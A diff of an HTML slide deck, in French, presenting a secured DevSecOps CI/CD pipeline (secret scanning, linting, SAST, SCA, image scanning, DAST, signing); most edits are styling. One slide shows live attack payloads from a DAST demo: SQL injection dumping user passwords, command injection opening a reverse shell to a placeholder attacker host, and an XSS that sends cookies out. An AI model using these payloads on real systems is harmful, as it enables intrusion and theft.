@@ -4,195 +4,243 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>DevSecOps - Pipeline CI/CD</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#0b0d17;--bg2:#111827;--bg3:#1e293b;
-  --text:#e2e8f0;--muted:#94a3b8;--dim:#475569;
-  --accent:#38bdf8;--accent2:#818cf8;--green:#34d399;
-  --red:#f87171;--orange:#fb923c;--pink:#f472b6;--yellow:#fbbf24;
+  --bg:#fafbfe;--bg2:#ffffff;--bg3:#f1f5f9;
+  --text:#1e293b;--muted:#64748b;--dim:#94a3b8;
+  --sea:#0369a1;--sea-light:#e0f2fe;--sea-mid:#38bdf8;
+  --coral:#e11d48;--coral-light:#fff1f2;
+  --sand:#f59e0b;--sand-light:#fef9ee;
+  --lavender:#7c3aed;--lavender-light:#f5f3ff;
+  --mint:#059669;--mint-light:#ecfdf5;
+  --sky:#0ea5e9;
+  --shadow:0 1px 3px rgba(0,0,0,0.04),0 4px 16px rgba(0,0,0,0.04);
+  --shadow-lg:0 4px 24px rgba(0,0,0,0.06),0 1px 4px rgba(0,0,0,0.04);
 }
-html{font-size:clamp(12px,1.4vw,18px);scroll-behavior:smooth}
-body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden}
+html{font-size:clamp(13px,1.4vw,17px);scroll-behavior:smooth}
+body{
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  background:var(--bg);color:var(--text);
+  overflow-x:hidden;-webkit-font-smoothing:antialiased;
+}
 
-/* ===== SLIDE SYSTEM ===== */
+/* ===== SLIDE ===== */
 .slide{
   min-height:100vh;width:100%;
   display:flex;flex-direction:column;align-items:center;justify-content:center;
-  padding:clamp(2rem,5vw,5rem) clamp(1.5rem,8vw,8rem);
+  padding:clamp(3rem,6vh,6rem) clamp(2rem,10vw,10rem);
   position:relative;
 }
-.slide::after{
-  content:'';position:absolute;bottom:0;left:10%;right:10%;
-  height:1px;background:linear-gradient(90deg,transparent,var(--dim),transparent);
-}
-.slide:last-child::after{display:none}
+.slide:nth-child(even){background:#fff}
+.slide:nth-child(odd){background:var(--bg)}
 
 /* ===== TYPOGRAPHY ===== */
-h1{font-size:clamp(2rem,5vw,4rem);font-weight:800;letter-spacing:-0.03em;line-height:1.1}
-h2{font-size:clamp(1.4rem,3vw,2.4rem);font-weight:700;letter-spacing:-0.02em;margin-bottom:1.5rem;color:var(--accent)}
-h3{font-size:clamp(1rem,1.8vw,1.3rem);font-weight:600;color:var(--accent2);margin-bottom:0.75rem}
-p,.desc{font-size:clamp(0.85rem,1.2vw,1.1rem);line-height:1.7;color:var(--muted);max-width:60ch}
+h1{font-size:clamp(2.2rem,5.5vw,4.2rem);font-weight:800;letter-spacing:-0.04em;line-height:1.05;color:var(--text)}
+h2{font-size:clamp(1.5rem,3vw,2.2rem);font-weight:700;letter-spacing:-0.03em;margin-bottom:1.8rem;color:var(--text)}
+h3{font-size:clamp(0.95rem,1.5vw,1.15rem);font-weight:600;color:var(--sea);margin-bottom:0.6rem;letter-spacing:-0.01em}
+p,.desc{font-size:clamp(0.9rem,1.15vw,1.05rem);line-height:1.75;color:var(--muted);max-width:55ch}
+small{font-size:0.8em;color:var(--muted)}
 
 /* ===== LAYOUT ===== */
-.cols{display:grid;grid-template-columns:1fr 1fr;gap:clamp(1.5rem,3vw,3rem);width:100%;max-width:64rem;text-align:left}
-.cols-3{display:grid;grid-template-columns:repeat(3,1fr);gap:clamp(1rem,2vw,2rem);width:100%;max-width:72rem}
-@media(max-width:768px){.cols,.cols-3{grid-template-columns:1fr}}
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:clamp(1.5rem,3vw,2.5rem);width:100%;max-width:60rem;text-align:left}
+@media(max-width:768px){.cols{grid-template-columns:1fr}}
 .center{text-align:center}
-.w-full{width:100%;max-width:64rem}
+.w-full{width:100%;max-width:60rem}
 .mt{margin-top:1.5rem}
 .mb{margin-bottom:1.5rem}
-.gap{gap:1rem}
 
 /* ===== BADGE ===== */
 .badge{
-  display:inline-block;padding:0.25rem 1rem;border-radius:2rem;
-  font-size:0.7rem;font-weight:700;text-transform:uppercase;letter-spacing:0.12em;
-  margin-bottom:1rem;
+  display:inline-block;padding:0.3rem 1rem;border-radius:2rem;
+  font-size:0.65rem;font-weight:600;text-transform:uppercase;letter-spacing:0.14em;
+  margin-bottom:1.2rem;
 }
-.b-red{background:#991b1b;color:#fecaca}
-.b-yellow{background:#92400e;color:#fef3c7}
-.b-purple{background:#5b21b6;color:#ede9fe}
-.b-blue{background:#1e40af;color:#dbeafe}
-.b-cyan{background:#155e75;color:#cffafe}
-.b-rose{background:#9f1239;color:#ffe4e6}
-.b-green{background:#065f46;color:#d1fae5}
-.b-orange{background:#9a3412;color:#ffedd5}
-.b-demo{background:#166534;color:#bbf7d0}
+.b-red{background:var(--coral-light);color:var(--coral)}
+.b-yellow{background:var(--sand-light);color:#b45309}
+.b-purple{background:var(--lavender-light);color:var(--lavender)}
+.b-blue{background:var(--sea-light);color:var(--sea)}
+.b-cyan{background:#ecfeff;color:#0e7490}
+.b-rose{background:var(--coral-light);color:var(--coral)}
+.b-green{background:var(--mint-light);color:var(--mint)}
+.b-orange{background:#fff7ed;color:#c2410c}
+.b-demo{background:var(--mint-light);color:var(--mint)}
 
-/* ===== CARDS ===== */
+/* ===== CARD ===== */
 .card{
-  background:var(--bg2);border:1px solid rgba(255,255,255,0.06);border-radius:0.75rem;
-  padding:clamp(1.2rem,2vw,2rem);text-align:left;
+  background:var(--bg2);border:1px solid #e2e8f0;border-radius:1rem;
+  padding:clamp(1.5rem,2.5vw,2rem);text-align:left;
+  box-shadow:var(--shadow);transition:box-shadow 0.3s,transform 0.3s;
 }
+.card:hover{box-shadow:var(--shadow-lg);transform:translateY(-2px)}
 .card h3{margin-top:0}
 
 /* ===== CODE ===== */
 pre{
-  background:#0d1117;border:1px solid rgba(255,255,255,0.08);border-radius:0.6rem;
-  padding:clamp(1rem,1.5vw,1.5rem);overflow-x:auto;text-align:left;
-  font-family:'Cascadia Code','Fira Code','JetBrains Mono',monospace;
-  font-size:clamp(0.65rem,0.95vw,0.85rem);line-height:1.65;color:#c9d1d9;
-  width:100%;max-width:64rem;
+  background:#0f172a;border-radius:0.75rem;
+  padding:clamp(1.2rem,1.8vw,1.8rem);overflow-x:auto;text-align:left;
+  font-family:'JetBrains Mono','Fira Code',monospace;
+  font-size:clamp(0.65rem,0.88vw,0.8rem);line-height:1.7;color:#e2e8f0;
+  width:100%;max-width:60rem;box-shadow:var(--shadow-lg);
 }
-pre .kw{color:#ff7b72}
-pre .str{color:#a5d6ff}
-pre .cm{color:#8b949e;font-style:italic}
-pre .fn{color:#d2a8ff}
+pre .kw{color:#f472b6}
+pre .str{color:#7dd3fc}
+pre .cm{color:#64748b;font-style:italic}
+pre .fn{color:#c4b5fd}
 
 /* ===== LIST ===== */
 ul{list-style:none;padding:0}
 ul li{
-  padding-left:1.5rem;margin-bottom:0.6rem;position:relative;
-  font-size:clamp(0.8rem,1.1vw,1rem);line-height:1.65;color:var(--text);
+  padding-left:1.5rem;margin-bottom:0.55rem;position:relative;
+  font-size:clamp(0.85rem,1.05vw,0.95rem);line-height:1.7;color:var(--text);
 }
-ul li::before{content:'\25B8';position:absolute;left:0;color:var(--accent);font-size:0.8em}
+ul li::before{content:'';position:absolute;left:0;top:0.6em;width:6px;height:6px;border-radius:50%;background:var(--sea-mid)}
 
 /* ===== TABLE ===== */
-table{width:100%;border-collapse:collapse;font-size:clamp(0.7rem,1vw,0.9rem)}
-th{background:var(--bg3);color:var(--accent);padding:0.6rem 0.8rem;text-align:left;font-weight:600;border-bottom:2px solid rgba(255,255,255,0.08)}
-td{padding:0.5rem 0.8rem;border-bottom:1px solid rgba(255,255,255,0.04);color:var(--text)}
-tr:hover td{background:rgba(56,189,248,0.03)}
+table{width:100%;border-collapse:collapse;font-size:clamp(0.75rem,0.95vw,0.88rem)}
+th{
+  background:var(--bg3);color:var(--sea);padding:0.7rem 1rem;text-align:left;
+  font-weight:600;font-size:0.8em;text-transform:uppercase;letter-spacing:0.08em;
+  border-bottom:2px solid #e2e8f0;
+}
+td{padding:0.6rem 1rem;border-bottom:1px solid #f1f5f9;color:var(--text)}
+tr:hover td{background:#f8fafc}
 
 /* ===== PIPELINE VIS ===== */
 .pipeline{display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:0.5rem;margin:1.5rem 0}
 .pnode{
-  background:var(--bg2);border:1.5px solid var(--dim);border-radius:0.5rem;
-  padding:0.5rem 1rem;font-size:clamp(0.65rem,0.9vw,0.8rem);font-weight:600;
-  text-align:center;transition:all 0.3s;
+  background:var(--bg2);border:1.5px solid #e2e8f0;border-radius:0.6rem;
+  padding:0.5rem 1.1rem;font-size:clamp(0.7rem,0.9vw,0.82rem);font-weight:600;
+  text-align:center;box-shadow:var(--shadow);color:var(--text);
+  transition:all 0.3s;
 }
-.pnode:hover{border-color:var(--accent);box-shadow:0 0 20px rgba(56,189,248,0.15)}
-.parr{color:var(--dim);font-size:1.2rem}
+.pnode:hover{border-color:var(--sea-mid);box-shadow:0 4px 20px rgba(14,165,233,0.12)}
+.parr{color:var(--dim);font-size:1.1rem}
 
-/* ===== HIGHLIGHT BOX ===== */
+/* ===== INFO BOX ===== */
 .info{
-  background:rgba(56,189,248,0.06);border-left:3px solid var(--accent);
-  padding:1rem 1.2rem;border-radius:0 0.5rem 0.5rem 0;
-  font-size:clamp(0.75rem,1vw,0.9rem);text-align:left;max-width:64rem;width:100%;
+  background:var(--sea-light);border-left:3px solid var(--sea);
+  padding:1rem 1.3rem;border-radius:0 0.6rem 0.6rem 0;
+  font-size:clamp(0.78rem,0.95vw,0.88rem);text-align:left;max-width:60rem;width:100%;
   color:var(--text);margin-top:1rem;
 }
-.info strong{color:var(--accent)}
+.info strong{color:var(--sea)}
 
-/* ===== DEMO CMD ===== */
+/* ===== CMD ===== */
 .cmd{
-  background:#0d1117;border:1px solid rgba(52,211,153,0.3);border-radius:0.5rem;
-  padding:0.7rem 1rem;font-family:monospace;font-size:clamp(0.65rem,0.9vw,0.8rem);
-  text-align:left;color:var(--green);max-width:64rem;width:100%;margin:0.4rem 0;
+  background:#0f172a;border-radius:0.5rem;
+  padding:0.7rem 1.1rem;font-family:'JetBrains Mono',monospace;
+  font-size:clamp(0.65rem,0.85vw,0.78rem);
+  text-align:left;color:#34d399;max-width:60rem;width:100%;margin:0.4rem 0;
   overflow-x:auto;
 }
-.cmd::before{content:'$ ';color:var(--dim)}
-.cmd.attack{color:var(--red);border-color:rgba(248,113,113,0.3)}
+.cmd::before{content:'$ ';color:#64748b}
+.cmd.attack{color:#fb7185}
 
 /* ===== TAG ===== */
 .tag{
-  display:inline-block;background:var(--bg3);border:1px solid rgba(255,255,255,0.08);
-  border-radius:0.3rem;padding:0.15rem 0.6rem;font-family:monospace;font-size:0.8em;margin:0.15rem;
+  display:inline-block;background:var(--bg3);border:1px solid #e2e8f0;
+  border-radius:0.3rem;padding:0.15rem 0.6rem;font-family:'JetBrains Mono',monospace;
+  font-size:0.78em;margin:0.15rem;color:var(--sea);
 }
 
 /* ===== SEVERITY ===== */
-.crit{color:var(--red);font-weight:700}
-.high{color:var(--orange);font-weight:700}
+.crit{color:var(--coral);font-weight:600}
+.high{color:#ea580c;font-weight:600}
 
 /* ===== DIAGRAM ===== */
 .diagram{
-  background:var(--bg2);border:1px solid rgba(255,255,255,0.06);border-radius:0.75rem;
-  padding:clamp(1.2rem,2vw,2.5rem);max-width:56rem;width:100%;margin:1rem auto;
+  background:var(--bg2);border:1px solid #e2e8f0;border-radius:1rem;
+  padding:clamp(1.5rem,2.5vw,2.5rem);max-width:52rem;width:100%;
+  box-shadow:var(--shadow);
 }
 .dlayer{display:flex;justify-content:center;gap:clamp(0.5rem,1.5vw,1rem);flex-wrap:wrap;margin:0.5rem 0}
 .dbox{
-  background:var(--bg3);border:1.5px solid var(--dim);border-radius:0.5rem;
-  padding:0.6rem clamp(0.8rem,1.5vw,1.5rem);font-size:clamp(0.65rem,0.9vw,0.85rem);
-  text-align:center;min-width:clamp(5rem,8vw,7.5rem);
+  background:var(--bg3);border:1.5px solid #e2e8f0;border-radius:0.6rem;
+  padding:0.6rem clamp(0.8rem,1.5vw,1.4rem);font-size:clamp(0.7rem,0.9vw,0.85rem);
+  text-align:center;min-width:clamp(5rem,8vw,7rem);font-weight:500;
+  transition:all 0.3s;
 }
-.dbox.hl{border-color:var(--accent);background:rgba(56,189,248,0.08)}
-.dbox.grn{border-color:var(--green);background:rgba(52,211,153,0.08)}
-.dbox.org{border-color:var(--orange);background:rgba(251,146,60,0.08)}
-.dbox.big{min-width:clamp(12rem,25vw,28rem)}
-.darr{text-align:center;color:var(--dim);font-size:1.1rem;margin:0.3rem 0}
+.dbox:hover{box-shadow:var(--shadow)}
+.dbox.hl{border-color:var(--sea-mid);background:var(--sea-light);color:var(--sea)}
+.dbox.grn{border-color:#34d399;background:var(--mint-light);color:var(--mint)}
+.dbox.org{border-color:#fb923c;background:#fff7ed;color:#c2410c}
+.dbox.big{min-width:clamp(12rem,25vw,26rem)}
+.darr{text-align:center;color:var(--dim);font-size:1rem;margin:0.25rem 0}
 
 /* ===== GRADIENT TEXT ===== */
-.grad{background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.grad2{background:linear-gradient(135deg,var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.grad3{background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.grad{background:linear-gradient(135deg,var(--sea),var(--sky));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.grad2{background:linear-gradient(135deg,var(--lavender),var(--coral));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.grad3{background:linear-gradient(135deg,var(--sea),var(--lavender),var(--coral));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
 
 /* ===== SLIDE NUMBER ===== */
-.snum{
-  position:absolute;bottom:1.5rem;right:2rem;font-size:0.7rem;color:var(--dim);
-  font-variant-numeric:tabular-nums;
-}
+.snum{position:absolute;bottom:1.5rem;right:2.5rem;font-size:0.7rem;color:var(--dim);font-weight:500;font-variant-numeric:tabular-nums}
 
 /* ===== NAV ===== */
 nav{
   position:fixed;top:0;left:0;right:0;z-index:100;
-  background:rgba(11,13,23,0.85);backdrop-filter:blur(12px);
-  border-bottom:1px solid rgba(255,255,255,0.05);
+  background:rgba(250,251,254,0.88);backdrop-filter:blur(16px);
+  border-bottom:1px solid rgba(0,0,0,0.05);
   display:flex;align-items:center;justify-content:space-between;
-  padding:0.6rem clamp(1rem,3vw,2rem);
-  font-size:0.75rem;color:var(--muted);
+  padding:0.7rem clamp(1.5rem,4vw,3rem);
+  font-size:0.78rem;color:var(--muted);
 }
-nav .logo{font-weight:700;color:var(--accent);font-size:0.85rem}
-nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;left:0;transition:width 0.3s}
+nav .logo{font-weight:700;color:var(--sea);font-size:0.88rem;letter-spacing:-0.02em}
+nav .progress{height:2px;background:linear-gradient(90deg,var(--sea),var(--sky));position:absolute;bottom:0;left:0;transition:width 0.3s;border-radius:0 1px 1px 0}
 
-/* ===== FOOTER ===== */
+/* ===== VISION ===== */
+.vision{display:flex;gap:clamp(1rem,2.5vw,2.5rem);align-items:flex-start;width:100%;max-width:60rem;flex-wrap:wrap;justify-content:center}
+.vision-col{flex:1;min-width:12rem;text-align:center}
+.vision-col h3{font-size:clamp(0.8rem,1.05vw,0.95rem);margin-bottom:0.75rem}
+.vision-col .dbox{margin:0.4rem auto;display:block;max-width:10rem}
+.vision-arrow{display:flex;align-items:center;font-size:1.6rem;color:var(--dim);padding-top:2.5rem}
+@media(max-width:768px){.vision-arrow{transform:rotate(90deg);padding:0.5rem 0}}
+
+/* ===== HERO DECORATION ===== */
+.hero-deco{
+  position:absolute;top:-20%;right:-10%;width:50vw;height:50vw;
+  background:radial-gradient(circle,rgba(14,165,233,0.06) 0%,transparent 70%);
+  border-radius:50%;pointer-events:none;
+}
+.hero-deco2{
+  position:absolute;bottom:-15%;left:-10%;width:40vw;height:40vw;
+  background:radial-gradient(circle,rgba(124,58,237,0.04) 0%,transparent 70%);
+  border-radius:50%;pointer-events:none;
+}
+
+/* ===== SECTION TITLE SLIDE ===== */
+.section-slide{
+  background:linear-gradient(135deg,#0c4a6e,#0369a1,#0284c7) !important;
+  color:#fff;
+}
+.section-slide h1,.section-slide h2,.section-slide p{color:#fff}
+.section-slide .pnode{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.2);color:#fff}
+.section-slide .parr{color:rgba(255,255,255,0.4)}
+.section-slide .snum{color:rgba(255,255,255,0.3)}
+
+/* ===== FINAL SLIDE ===== */
+.final-slide{
+  background:linear-gradient(135deg,#0f172a,#1e293b) !important;
+  color:#fff;
+}
+.final-slide p{color:#94a3b8}
+.final-slide .snum{color:rgba(255,255,255,0.2)}
+
+/* ===== FOOT ===== */
 .foot{
   position:fixed;bottom:0;left:0;right:0;z-index:100;
-  background:rgba(11,13,23,0.8);backdrop-filter:blur(8px);
-  border-top:1px solid rgba(255,255,255,0.05);
+  background:rgba(250,251,254,0.85);backdrop-filter:blur(8px);
+  border-top:1px solid rgba(0,0,0,0.04);
   display:flex;align-items:center;justify-content:center;gap:0.5rem;
-  padding:0.5rem;font-size:0.7rem;color:var(--dim);
+  padding:0.45rem;font-size:0.68rem;color:var(--dim);
 }
 .foot kbd{
-  background:var(--bg3);border:1px solid var(--dim);border-radius:0.25rem;
-  padding:0.1rem 0.4rem;font-family:monospace;font-size:0.75em;
+  background:var(--bg3);border:1px solid #e2e8f0;border-radius:0.25rem;
+  padding:0.1rem 0.4rem;font-family:'JetBrains Mono',monospace;font-size:0.8em;
 }
-
-/* 3-col layout for vision globale */
-.vision{display:flex;gap:clamp(1rem,2vw,2rem);align-items:flex-start;width:100%;max-width:64rem;flex-wrap:wrap;justify-content:center}
-.vision-col{flex:1;min-width:12rem;text-align:center}
-.vision-col h3{font-size:clamp(0.8rem,1.1vw,1rem);margin-bottom:0.75rem}
-.vision-col .dbox{margin:0.4rem auto;display:block;max-width:10rem}
-.vision-arrow{display:flex;align-items:center;font-size:1.8rem;color:var(--dim);padding-top:3rem}
-@media(max-width:768px){.vision-arrow{transform:rotate(90deg);padding:0.5rem 0}}
 </style>
 </head>
 <body>
@@ -204,9 +252,13 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
 </nav>
 
 <!-- ==================== 1. TITRE ==================== -->
-<div class="slide" id="s1">
-  <h1 class="grad" style="margin-bottom:1rem">DevSecOps</h1>
-  <p class="center" style="font-size:clamp(1rem,1.6vw,1.3rem);margin-bottom:2.5rem">Pipeline CI/CD Securisee &mdash; De l'analyse au deploiement</p>
+<div class="slide" id="s1" style="background:#fff">
+  <div class="hero-deco"></div>
+  <div class="hero-deco2"></div>
+  <h1 style="margin-bottom:0.8rem"><span class="grad">DevSecOps</span></h1>
+  <p class="center" style="font-size:clamp(1rem,1.5vw,1.25rem);color:var(--muted);margin-bottom:2.5rem">
+    Pipeline CI/CD Securisee &mdash; De l'analyse au deploiement
+  </p>
   <div class="pipeline">
     <span class="pnode">Secrets</span><span class="parr">&rarr;</span>
     <span class="pnode">Linter</span><span class="parr">&rarr;</span>
@@ -214,7 +266,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
     <span class="pnode">SCA</span><span class="parr">&rarr;</span>
     <span class="pnode">Infra</span><span class="parr">&rarr;</span>
     <span class="pnode">DAST</span><span class="parr">&rarr;</span>
-    <span class="pnode" style="border-color:var(--green);color:var(--green)">Sign</span>
+    <span class="pnode" style="border-color:#34d399;color:var(--mint)">Sign</span>
   </div>
   <span class="snum">1</span>
 </div>
@@ -224,7 +276,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   <h2>Sommaire</h2>
   <div class="cols">
     <div class="card">
-      <h3 style="color:var(--accent)">Partie 1 &mdash; Pipeline CI/CD</h3>
+      <h3 style="color:var(--sea)">Partie 1 &mdash; Pipeline CI/CD</h3>
       <ul>
         <li>Architecture de la pipeline</li>
         <li>Etape 1 : Secrets (TruffleHog)</li>
@@ -236,7 +288,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       </ul>
     </div>
     <div class="card">
-      <h3 style="color:var(--accent2)">Partie 2 &mdash; Et ensuite ?</h3>
+      <h3 style="color:var(--lavender)">Partie 2 &mdash; Et ensuite ?</h3>
       <ul>
         <li>Signature d'image (Cosign)</li>
         <li>Admission Controllers (Kyverno)</li>
@@ -264,19 +316,13 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <div class="dbox hl"><strong>SCA</strong><br><small>Trivy FS</small></div>
     </div>
     <div class="darr">&darr;&darr;</div>
-    <div class="dlayer">
-      <div class="dbox hl"><strong>Infra</strong><br><small>Trivy Image</small></div>
-    </div>
+    <div class="dlayer"><div class="dbox hl"><strong>Infra</strong><br><small>Trivy Image</small></div></div>
     <div class="darr">&darr;</div>
-    <div class="dlayer">
-      <div class="dbox hl"><strong>DAST</strong><br><small>ZAP</small></div>
-    </div>
+    <div class="dlayer"><div class="dbox hl"><strong>DAST</strong><br><small>ZAP</small></div></div>
     <div class="darr">&darr;</div>
-    <div class="dlayer">
-      <div class="dbox grn"><strong>Signature</strong><br><small>Cosign</small></div>
-    </div>
+    <div class="dlayer"><div class="dbox grn"><strong>Signature</strong><br><small>Cosign</small></div></div>
   </div>
-  <p class="center" style="margin-top:1rem">Les jobs s'executent en parallele quand possible, puis convergent</p>
+  <p class="center mt">Les jobs s'executent en parallele quand possible, puis convergent</p>
   <span class="snum">3</span>
 </div>
 
@@ -351,7 +397,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <span class="kw">with:</span>
         <span class="kw">extra_args:</span> --only-verified</pre>
   <div class="info">
-    <strong>--only-verified :</strong> Ne bloque la pipeline que sur les secrets confirmes comme valides (appel API reel). Reduit les faux positifs.
+    <strong>--only-verified :</strong> Ne bloque la pipeline que sur les secrets confirmes comme valides via appel API reel. Reduit les faux positifs.
   </div>
   <span class="snum">6</span>
 </div>
@@ -385,7 +431,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <ul>
         <li>Code propre = moins de bugs = moins de vulnerabilites</li>
         <li>Standard <strong>PSR-12</strong> pour PHP</li>
-        <li>Lisibilite et maintenabilite</li>
+        <li>Lisibilite et maintenabilite du code</li>
       </ul>
     </div>
     <div class="card">
@@ -401,8 +447,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   <pre class="mt"><span class="fn">check-quality:</span>
   <span class="kw">runs-on:</span> ubuntu-latest
   <span class="kw">steps:</span>
-    - <span class="kw">name:</span> Recuperation du code
-      <span class="kw">uses:</span> actions/checkout@v4
+    - <span class="kw">uses:</span> actions/checkout@v4
     - <span class="kw">name:</span> Linter PHP (PSR-12)
       <span class="kw">run:</span> |
         docker run --rm -v <span class="str">"$(pwd)/src"</span>:/data cytopia/phpcs --standard=PSR12 --ignore=vendor/* /data</pre>
@@ -418,8 +463,8 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <h3>Analyse Boite Blanche</h3>
       <ul>
         <li>Examine le <strong>code source</strong> sans l'executer</li>
-        <li>Coeur du <strong>Shift Left</strong></li>
-        <li>Correction en phase de codage (10x moins couteux qu'en prod)</li>
+        <li>Coeur du principe <strong>Shift Left</strong></li>
+        <li>Correction en phase de codage (10x moins couteux qu'en production)</li>
       </ul>
     </div>
     <div class="card">
@@ -446,8 +491,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   <span class="kw">container:</span>
     <span class="kw">image:</span> returntocorp/semgrep
   <span class="kw">steps:</span>
-    - <span class="kw">name:</span> Recuperation du code
-      <span class="kw">uses:</span> actions/checkout@v4
+    - <span class="kw">uses:</span> actions/checkout@v4
     - <span class="kw">name:</span> Scan SAST (Semgrep)
       <span class="kw">run:</span> semgrep scan --config=p/php --error --verbose</pre>
   <div class="info">
@@ -467,7 +511,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <ul>
         <li>Analyse des <strong>dependances</strong> (composer.lock)</li>
         <li>Compare avec les bases de <strong>CVE</strong> connues</li>
-        <li>Identifie les composants obsoletes / non maintenus</li>
+        <li>Identifie les composants obsoletes ou non maintenus</li>
       </ul>
     </div>
     <div class="card">
@@ -481,7 +525,6 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   </div>
   <pre class="mt"><span class="fn">sca-analysis:</span>
   <span class="kw">needs:</span> [check-secrets, check-quality]
-  <span class="kw">runs-on:</span> ubuntu-latest
   <span class="kw">steps:</span>
     - <span class="kw">uses:</span> actions/checkout@v4
     - <span class="kw">name:</span> Installation des dependances
@@ -512,14 +555,13 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <h3>Remediation</h3>
       <ul>
         <li>Upgrade vers <code>php:8.2-apache</code></li>
-        <li>Resultat : <strong style="color:var(--green)">0 CRITICAL</strong></li>
+        <li>Resultat : <strong style="color:var(--mint)">0 CRITICAL</strong></li>
         <li>Encore mieux : image Alpine FPM</li>
       </ul>
     </div>
   </div>
   <pre class="mt"><span class="fn">infra-analysis:</span>
   <span class="kw">needs:</span> [sast-analysis, sca-analysis]
-  <span class="kw">runs-on:</span> ubuntu-latest
   <span class="kw">steps:</span>
     - <span class="kw">uses:</span> actions/checkout@v4
     - <span class="kw">name:</span> Build de l'image Docker
@@ -580,39 +622,39 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   <h2>DAST &mdash; Exploitation manuelle</h2>
   <div class="cols">
     <div class="card">
-      <h3 style="color:var(--red)">Injection SQL</h3>
+      <h3 style="color:var(--coral)">Injection SQL</h3>
       <div class="cmd attack">' OR 1=1 #</div>
       <div class="cmd attack">' UNION SELECT concat(username,':',password), 2, 3 FROM users -- -</div>
-      <p class="mt" style="font-size:0.85em">Dump complet des utilisateurs et mots de passe hashés</p>
+      <p class="mt" style="font-size:0.85em">Dump complet des utilisateurs et mots de passe hashes</p>
     </div>
     <div class="card">
-      <h3 style="color:var(--red)">RCE (Remote Code Execution)</h3>
+      <h3 style="color:var(--coral)">RCE (Remote Code Execution)</h3>
       <div class="cmd attack">8.8.8.8; env</div>
       <div class="cmd attack">8.8.8.8; bash -c 'bash -i >&amp; /dev/tcp/ATTACKER/4444 0>&amp;1'</div>
       <p class="mt" style="font-size:0.85em">Reverse shell = controle total du serveur</p>
     </div>
   </div>
   <div class="card mt w-full">
-    <h3 style="color:var(--red)">XSS (Vol de session)</h3>
+    <h3 style="color:var(--coral)">XSS &mdash; Vol de session</h3>
     <div class="cmd attack">&lt;script&gt;fetch('http://ATTACKER:8080/?c='+document.cookie)&lt;/script&gt;</div>
   </div>
   <span class="snum">14</span>
 </div>
 
 <!-- ==================== 15. TRANSITION ==================== -->
-<div class="slide" id="s15" style="background:linear-gradient(135deg,#0b0d17,#1a0a2e)">
-  <h1 class="grad2" style="margin-bottom:1rem">Et ensuite ?</h1>
-  <p class="center" style="font-size:clamp(1rem,1.5vw,1.2rem)">Securiser au-dela de la pipeline CI/CD</p>
+<div class="slide section-slide" id="s15">
+  <h1 style="margin-bottom:0.8rem;-webkit-text-fill-color:#fff">Et ensuite ?</h1>
+  <p style="font-size:clamp(1rem,1.4vw,1.2rem);color:rgba(255,255,255,0.85)">Securiser au-dela de la pipeline CI/CD</p>
   <div class="pipeline mt">
-    <span class="pnode" style="border-color:var(--green);color:var(--green)">Deploy<br><small>Signature</small></span>
-    <span class="parr" style="color:var(--accent2)">&rarr;</span>
-    <span class="pnode" style="border-color:var(--accent2);color:var(--accent2)">Admission<br><small>Controle</small></span>
-    <span class="parr" style="color:var(--accent2)">&rarr;</span>
-    <span class="pnode" style="border-color:var(--pink);color:var(--pink)">Runtime<br><small>Protection</small></span>
-    <span class="parr" style="color:var(--accent2)">&rarr;</span>
-    <span class="pnode" style="border-color:var(--orange);color:var(--orange)">Monitor<br><small>Continu</small></span>
+    <span class="pnode" style="background:rgba(255,255,255,0.15);border-color:rgba(255,255,255,0.3);color:#fff"><strong>Deploy</strong><br><small style="color:rgba(255,255,255,0.7)">Signature</small></span>
+    <span class="parr" style="color:rgba(255,255,255,0.5)">&rarr;</span>
+    <span class="pnode" style="background:rgba(255,255,255,0.15);border-color:rgba(255,255,255,0.3);color:#fff"><strong>Admission</strong><br><small style="color:rgba(255,255,255,0.7)">Controle</small></span>
+    <span class="parr" style="color:rgba(255,255,255,0.5)">&rarr;</span>
+    <span class="pnode" style="background:rgba(255,255,255,0.15);border-color:rgba(255,255,255,0.3);color:#fff"><strong>Runtime</strong><br><small style="color:rgba(255,255,255,0.7)">Protection</small></span>
+    <span class="parr" style="color:rgba(255,255,255,0.5)">&rarr;</span>
